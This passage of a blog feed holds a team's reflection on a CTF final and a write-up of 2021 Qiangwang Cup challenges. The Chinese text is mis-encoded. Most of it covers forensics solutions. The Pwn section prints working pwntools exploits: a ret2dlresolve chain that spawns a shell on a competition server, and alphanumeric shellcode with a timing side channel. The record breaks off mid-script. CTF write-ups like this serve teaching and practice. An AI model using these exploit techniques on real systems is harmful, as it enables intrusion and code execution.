loading="lazy"><p>å’±17ä»3:00åˆšä¸Šåˆ°æœ€åæ²¡è¢«æ‰“ä¸€æ¬¡ï¼Œè€Œä¸”åˆšä¸Šå°±ä¸€ç›´åœ¨æ‰“åˆ«äººï¼Œç®—æ˜¯å°å°çš„æ¬£æ…°å§ã€‚</p><h4 id="18-30-ç¬¬57è½®-æ¯”èµ›ç»“æŸ"><a href="#18-30-ç¬¬57è½®-æ¯”èµ›ç»“æŸ" class="headerlink" title="18:30 - ç¬¬57è½® - æ¯”èµ›ç»“æŸ"></a>18:30 - ç¬¬57è½® - æ¯”èµ›ç»“æŸ</h4><p>æœ€ç»ˆè®°å½•</p><img src="/article/2021ciscnawd/BDD377D32C18C9C712D72741E9A5A11A.jpg" class="" title="BDD377D32C18C9C712D72741E9A5A11A" loading="lazy"><p>é¥­éƒ½å‡‰äº†ï¼Œä¸€å¤©æ²¡åƒä¸œè¥¿</p><hr><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ç»“æŸååˆç…§éƒ½æ²¡æœ‰ï¼Œæˆ‘ä»¬2åªé˜Ÿç›´æ¥ç¦»å¼€äº†èµ›åœºã€‚</p><p>è¿™æ˜¯5ä½å¤§ä¸‰å¸ˆå‚…ä»¬æœ€åä¸€æ¬¡æ¯”èµ›äº†å¯èƒ½ã€‚</p><p>å¤§äºŒæˆ‘æ˜¯webï¼Œä¸¤ä½æ˜¯pwnï¼Œä¸€ä½å‡†å¤‡è€ƒç ”å»ä¸æƒ³æ‰“ctfäº†ï¼Œå¦ä¸€ä½å¾ˆè‡ªè´£</p><p>é‚£ä½pwnå¸ˆå‚…å›æ ¡å2å°æ—¶å¤ç°äº†å…¨éƒ¨çš„é¢˜ï¼Œè‡ªåŠ¨åŒ–æäº¤flagè„šæœ¬æ³¨é‡Šæ‰ä¸€è¡Œå°±å¥½äº†</p><p>ä»–ç°åœ¨éå¸¸éå¸¸è‡ªè´£</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å…¶å®å¹¶ä¸æ˜¯pwnå¸ˆå‚…ä¸€ä¸ªäººçš„è´£ä»»ï¼Œæˆ‘ä»¬å›¢é˜Ÿçš„é—®é¢˜è¿˜æ˜¯å¾ˆå¤§ã€‚</p><p>3web1pwnçš„é…ç½®å°±æŠŠé‡æ‹…å‹åœ¨äº†pwnå¸ˆå‚…èº«ä¸Š</p><p>è¿™æ¬¡æ¯”èµ›è¯´å®è¯é¢˜ç›®ä¸‹å‘æ—¶é—´æœ‰ç‚¹ä¸åˆç†</p><p>å¼€èµ›2web2pwnï¼Œ12:00ç«Ÿä¸Šäº†2pwnï¼Œ15:00ä¸Šäº†1web</p><p>è¯´å®è¯å°±ç®—12:00ä¸Š1web1pwnï¼Œå³webå¤š3å°æ—¶ï¼Œpwnå°‘3å°æ—¶ã€‚å’±ä»¬è¿˜æ˜¯æœ‰æœºä¼šçš„</p><p>å½“ç„¶å’±ä¸èƒ½æ€ªä¸»åŠæ–¹é—®é¢˜ï¼Œå’±ä»¬è‡ªèº«pwnè–„å¼±æ˜¯æ ¹æœ¬é—®é¢˜</p><hr><h2 id="å¯¹äºä¸‹å±Šçš„æƒ³æ³•"><a href="#å¯¹äºä¸‹å±Šçš„æƒ³æ³•" class="headerlink" title="å¯¹äºä¸‹å±Šçš„æƒ³æ³•"></a>å¯¹äºä¸‹å±Šçš„æƒ³æ³•</h2><p>è§‰å¾—å’±ä»¬å¯¹äºæ–°äººçš„åŸ¹å…»å‡ºç°äº†é—®é¢˜ï¼Œå·¥ä½œå®¤çš„ä½œé£æ…µæ‡’ã€‚</p><p>å¯¹äºæˆ‘ä»¬è¿™å±Šï¼Œè¿›å…¥åæ²¡æœ‰å†æ¬¡è€ƒæ ¸ï¼Œ8ä½å¸ˆå‚…æœ‰çš„æ ¹æœ¬å°±ä¸å†å­¦ä¹ æŠ€æœ¯äº†</p><p>æ’é™¤èµ°æ–‡è‰ºè·¯çº¿ï¼ŒéæŠ€æœ¯è·¯çº¿ï¼Œæˆ‘ä»¬å¹³æ—¶çš„æŠ€æœ¯æå‡å…¨é è‡ªå·±è‡ªè§‰</p><p>å¯¹äº20å±Šï¼Œæˆ‘ä»¬åº”è¯¥é™¤äº†æ³¨é‡è‡ªèº«çš„æŠ€æœ¯æˆé•¿ï¼Œä¹Ÿè¦å…³æ³¨å­¦å¼Ÿå­¦å¦¹ä»¬çš„åŸ¹å…»</p><p>æˆ‘ä»¬å·¥ä½œå®¤å·²ç»æœ‰æ–­ä»£çš„è¿¹è±¡äº†ï¼Œè¿™æ¬¡æ¯”èµ›ä½“ç°äº†å‡ºæ¥ï¼Œæ˜å¹´å¯èƒ½ä¼šæ›´åŠ ä¸¥é‡</p><p>å’±å¸Œæœ›å°±ç®—ä»å¤´åšèµ·ï¼Œä¹Ÿä¸å¸Œæœ›è¾œè´Ÿå‰é¢å¸ˆå‚…ä»¬æ‰“ä¸‹çš„åŸºçŸ³</p><p>å°±è¿™æ ·å§</p><p>2021å¹´6æœˆ22æ—¥</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç¬¬ä¸€æ¬¡æ‰“æ­£å¼çš„å›½èµ›åŠå†³èµ›awdï¼Œå¤ç›˜æ€»ç»“ï¼Œåˆ†æä¸åæ€&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>2021å¼ºç½‘æ¯</title>
    <link href="https://err0r.top/article/2021qwb/"/>
    <id>https://err0r.top/article/2021qwb/</id>
    <published>2021-06-13T13:11:17.000Z</published>
    <updated>2021-06-21T05:32:29.291Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š"><a href="#ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š" class="headerlink" title="ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š"></a>ä¸€ã€æˆ˜é˜Ÿä¿¡æ¯ï¼š</h1><p>æˆ˜é˜Ÿåç§°ï¼šæˆ‘æ˜¯èœé¸¡QAQ</p><p>æˆ˜é˜Ÿæ’åï¼š68å</p><h1 id="äºŒã€è§£é¢˜æƒ…å†µ-ï¼š"><a href="#äºŒã€è§£é¢˜æƒ…å†µ-ï¼š" class="headerlink" title="äºŒã€è§£é¢˜æƒ…å†µ ï¼š"></a>äºŒã€è§£é¢˜æƒ…å†µ ï¼š</h1><img src="/article/2021qwb/image.png" class="" title="image" loading="lazy"><h1 id="ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š"><a href="#ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š" class="headerlink" title="ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š"></a>ä¸‰ã€è§£é¢˜è¿‡ç¨‹ï¼š</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h1><h2 id="ISO1995-SOLVED-ï½œ-D0gekong"><a href="#ISO1995-SOLVED-ï½œ-D0gekong" class="headerlink" title="ISO1995 | SOLVED ï½œ D0gekong"></a>ISO1995 | SOLVED ï½œ D0gekong</h2><p>æ‹¿åˆ°æ–‡ä»¶æ”¾è¿›kailç”¨fileå¯ä»¥çœ‹å‡ºæ˜¯ä¸€ä¸ªdebiançš„ç£ç›˜æ–‡ä»¶ï¼Œç”¨binwalkå¯ä»¥åˆ†ç¦»å‡ºä¸€ä¸ªisoæ–‡ä»¶ï¼Œç”¨ultraisoæ‰“å¼€isoæ–‡ä»¶ï¼Œå°†é‡Œé¢çš„æ–‡ä»¶æå–å‡ºæ¥</p><p>æå–å‡ºæ¥å¯å‘ç°æ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚çš„æ–‡æœ¬</p><img src="/article/2021qwb/thumbnail.png" class="" title="thumbnail" loading="lazy"><p>ç”¨batchæ‰¹å¤„ç†å‘½ä»¤æ‹¼æ¥å¯å¾—åˆ°ä»¥ä¸‹æ–‡æœ¬</p><pre class="language-none"><code class="language-none">!&#x3D;gF~B.@YBO1.%DYzbA-1]&#125;jH&amp;@ ,K[7t&#x2F;LOi*5b)L &#39;&lt;pw&#39;am\W4LH@\toGKE1f &quot;oDWOaf2&#123;1&#123;w_ov-m:af8A044iCT_+ $w3cz(L0O)L_-s8&#39;_&lt;Ic &#x2F;KFP9vrr~6\ni&#123;~#g5cs#7z2S++Y1BbYQV&#39;is1&#x3D;DZ_| 3T1QxWEwX]&#125;NS@_3SdKK]91b?s-rs6g0QwBs @4#5TGxw#&amp;4ArDw~_X&quot;!._IAo&#96;&#39;xso&#39;.s5)+c9RU&#39; &#x2F;%_b[rjioPOy!&amp;&#x2F;)wjKR#å·¥jih0&#39;\,Dr! &amp;PHNf%, YOWEJ(2wXj&#x2F;u~1@gh%&amp;_6z5U~A&#x3D;OpAV$E&#x2F; &gt;1Kg:@4tS:V4ZB&#96;1_x*.17B&amp;:&lt;XnOrw| 2TY_DSN&lt;zvbKCj7+6w&#39;r&#125;Lo8&#39;:fYC@Fv102vbo)noQ1MT3#AZ+]U3##P|w&#123;V&gt;z,G5[s r&#x2F;Ra~p&#39;&gt;o0Y]&#123;0&#123;8&quot;oh&#x3D;vG*S82KoNt17|,*r#d!&#x3D;N&#39;%0$1Tron:7&#125;6c(yVSIZmtw8xza]6D ,nn*q&amp;KHNK,PW .b&lt;h E$)&#123;Kw_)h ,&#x3D;m41LAv&#39;f61:T xN:4z0&#123;&gt;&amp;F5(cRg| :M9RVX$,8&#x2F;1vq-][?a&#x2F;H)1&quot;x; ((,NZ(&#x3D;wJ4o&lt;&#x2F;_8.D9Q8~t&quot;aA:RNTXpSC8LKW+Pfgw&lt;NTqmy_8G6Np%c-9tAG-em&amp;]1IYtz\12a1KD&amp;z&lt;k &#39;w7HFr--py2uH&#x3D;;37*iuisp39+m ;&quot;1:xPJBC*LB8;x*?G. &#39; &#96;nA[PibSKN&gt;RFG#vDrw7k@QcOebUkG,~fvtxH [w&lt;f:e]mcbx,Yi6KcZ~å…«VHLR,t&#123;F&#x3D;&#125;gTKX&amp;;A_Fv1b,DeZJ1N]6q)76a]Us&#x3D;\u8tY;t*#]zSGo~-h64&#x3D;u2bGZ)1(&amp;%K68a!nQke&amp;+gX&#x3D;L4TmMy$5nHC&amp;+#&lt;486HKF4f0d%1?I:1&#x3D;M[p~DXELtCKh\&gt;4&lt;Qf+cj?a3pOF~4*-9%7*&lt;~&#39; +KkQ&lt;*z9oUgrgo$:NC.Di&lt;.$&#96;s+69Pn7:TgO~A\TKn |Q&#39;G&amp;9TX-@!6w&lt;VK_5tH&#x2F;#i&gt;$7SKKH[Dki-o&#123;b&#123;?j?4.ZW+aV! |zi&#123;2oTqk*#! o0h$-6oCbPpazbPfi</code></pre><p>ç„¶åæŠŠisoæ”¾è¿›010é‡Œï¼Œæœç´¢FFFF,å‘ç°FFFFåé¢çš„ä¸¤å­—èŠ‚æ¯ä¸ªéƒ½ä¸ä¸€æ ·çŒœæµ‹æœ‰è¹Šè··ï¼Œç”¨è„šæœ¬æå–å‡ºæ¥</p><p>è„šæœ¬é™„ä¸Šï¼š</p><pre class="language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"iso1995.iso"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"\xff\xff\xff\xff"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        temp <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>index<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        result <span class="token operator">+=</span> temp        data <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">import</span> structbase <span class="token operator">=</span> <span class="token string">"iso1995/flag_f"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base <span class="token operator">+</span> name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>            result <span class="token operator">+=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>å¯å¾—åˆ°ä»¥ä¸‹æ–‡æœ¬ï¼Œåœ¨é‡Œé¢æ‰¾åˆ°flag</p><p>FLAG{Dir3ct0ry_jYa_n41}</p><h2 id="EzTime-SOLVED-ï½œ-D0gekong"><a href="#EzTime-SOLVED-ï½œ-D0gekong" class="headerlink" title="EzTime | SOLVED ï½œ D0gekong"></a>EzTime | SOLVED ï½œ D0gekong</h2><p>è§£å‹å¾—åˆ°æ–‡ä»¶</p><p>ç›´æ¥ç”¨ntfs log trackerå·¥å…·ä¸€æŠŠæ¢­</p><p>æ ¹æ®é¢˜ç›®æç¤ºå‘ç°æœ‰å¾ˆå¤šè·Ÿflagç›¸ä¼¼çš„æ–‡æœ¬</p><p>ä¸€ä¸ªä¸€ä¸ªå°è¯•ï¼Œæœ€åå‘ç°flagæ˜¯{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png</p><h2 id="BlueTeaming-SOLVEDï½œHn13"><a href="#BlueTeaming-SOLVEDï½œHn13" class="headerlink" title="BlueTeaming | SOLVEDï½œHn13"></a>BlueTeaming | SOLVEDï½œHn13</h2><p>è§£å‹æ–‡ä»¶å¯å¾—memory.dmp,é€šè¿‡volatilityçš„dumpå£ä»¤å°†æ³¨å†Œè¡¨ç»™æå–å‡ºæ¥æ”¾å…¥windows registry recoveryæŸ¥çœ‹æ³¨å†Œè¡¨</p><p>æŸ¥é˜…è·¯å¾„ç¿»åˆ°HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communicationé‡Œæœ‰powerÂ shellÂ è„šæœ¬Â </p><p>åˆ°åé¢æ‰æ„è¯†åˆ°è¿™å°±æ˜¯</p><p>flag:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</p><h2 id="CipherMan-SOLVED-Hn13"><a href="#CipherMan-SOLVED-Hn13" class="headerlink" title="CipherMan | SOLVED |Hn13"></a>CipherMan | SOLVED |Hn13</h2><p>è§£å‹æ–‡ä»¶ï¼Œæ‰“å¼€ä¸¤ä¸ªå·å‘ç°é‡Œé¢çš„secretéœ€è¦å…ˆè·å–å¯†ç æ‰èƒ½è§£å¼€åˆ†åŒº.</p><p>ç”±ç»™å‡ºçš„å†…å®¹å¯çŸ¥ï¼Œå¯†ç åº”è¯¥æ”¾åœ¨memoryä¸­ï¼Œç»“åˆfilescanä»¥åŠgrepå‘ç°ä¸¤ä¸ªæ–‡ä»¶</p><p>å¯¼å‡ºæ¥æ˜¯è¿™æ ·</p><p>221628-533357-667392-449185-516428-718443-190674-375100ä¸ºè§£å¯†å¯†é’¥</p><p>è¾“å…¥å¯†é’¥æ‰“å¼€åæœ‰ä¸ªreadmeæ–‡ä»¶ï¼Œæ‰“å¼€å°±æ˜¯flag</p><p>flagï¼šWow,Â youÂ haveÂ aÂ greatÂ ability.Â HowÂ didÂ youÂ solveÂ this?Â AreÂ youÂ aÂ hacker?Â PleaseÂ giveÂ meÂ aÂ lessonlater.</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h1><h2 id="å¼ºç½‘å…ˆé”‹-on-output-SOLVED-winter"><a href="#å¼ºç½‘å…ˆé”‹-on-output-SOLVED-winter" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]on output| SOLVED |winter"></a>[å¼ºç½‘å…ˆé”‹]on output| SOLVED |winter</h2><p>è§¦å‘å°±èƒ½æœ‰å¦‚ä¸‹çš„æº¢å‡º</p><p>ç›´æ¥è§¦å‘ä¿¡å·å¾—åˆ°æº¢å‡ºè¿›è¡Œret2_dl_runtime_resolveå°±è¡Œäº†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token comment">#p = process("./test")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.138.97'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x30</span>src <span class="token operator">=</span> <span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">0x20</span>s<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>s<span class="token punctuation">(</span>src<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"hello_boy\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>context<span class="token punctuation">.</span>binary<span class="token punctuation">)</span>dlresolve <span class="token operator">=</span> Ret2dlresolvePayload<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>symbol<span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dlresolve<span class="token punctuation">.</span>data_addr<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>ret2dlresolve<span class="token punctuation">(</span>dlresolve<span class="token punctuation">)</span>raw_rop <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0x4c</span><span class="token punctuation">:</span>raw_rop<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">:</span>dlresolve<span class="token punctuation">.</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h2 id="Shellcode-SOLVED-H3h3QAQ"><a href="#Shellcode-SOLVED-H3h3QAQ" class="headerlink" title="Shellcode | SOLVED | H3h3QAQ"></a>Shellcode | SOLVED | H3h3QAQ</h2><p>Readå’Œmmapæ²¡æœ‰è¢«ç¦ã€‚</p><p>å…ˆmmapå‡ºä¸€ç‰‡ç©ºé—´ï¼Œç„¶ååˆ‡æ¢ä½æ•°ï¼Œå†æ¬¡read shellcodeï¼Œå†æŠŠflagè¯»å…¥å†…å­˜ï¼Œå¾ªç¯ç”¨cmpä¸€ä½ä¸€ä½åˆ¤æ–­ï¼Œæœ€åæ‹¼æ¥å¾—åˆ°flagã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context(log_level = 'debug')</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>    append_x86 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push ebx    pop ebx    '''</span>    shellcode_open <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov esp,0x40404140    push 0x67616c66    push esp    pop ebx    xor ecx,ecx    mov eax,5    int 0x80    mov ecx,eax    '''</span>    shellcode_flag <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x33    push 0x40404089    retfq    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    '''</span>     <span class="token comment"># cmp</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    shellcode_open <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_open<span class="token punctuation">)</span>    shellcode_flag <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_flag<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">''</span>    append <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rdx    pop rdx    '''</span>    shellcode_mmap <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rdi    push 0x7e    pop rsi    push 0x40    pop rax    xor al,0x47    push rax    pop rdx    push 0x40    pop rax    xor al,0x40    push rax    pop r8    push rax    pop r9    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x31],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x32],cl    push 0x22    pop rcx    push 0x40    pop rax    xor al,0x49    '''</span>    shellcode_read <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rsi    push 0x40    pop rax    xor al,0x40    push rax    pop rdi    xor al,0x40    push 0x70    pop rdx    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x57],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x58],cl    push rdx    pop rax    xor al,0x70    '''</span>    shellcode_retfq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rbx    pop rax    xor al,0x40    push 0x72    pop rcx    xor byte ptr[rax+0x40],cl    push 0x68    pop rcx    xor byte ptr[rax+0x40],cl    push 0x47    pop rcx    sub byte ptr[rax+0x41],cl    push 0x48    pop rcx    sub byte ptr[rax+0x41],cl    push rdi    push rdi    push 0x23    push 0x40404040    pop rax    push rax    '''</span>    shellcode <span class="token operator">+=</span> shellcode_mmap    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_read    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_retfq    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode_open <span class="token operator">+</span> <span class="token number">0x29</span><span class="token operator">*</span><span class="token string">b'\x90'</span> <span class="token operator">+</span> shellcode_flag<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.105.137.118'</span><span class="token punctuation">,</span> <span class="token number">50050</span><span class="token punctuation">)</span>        <span class="token comment">#p=process('./shellcode')</span>        pwn<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>            flag<span 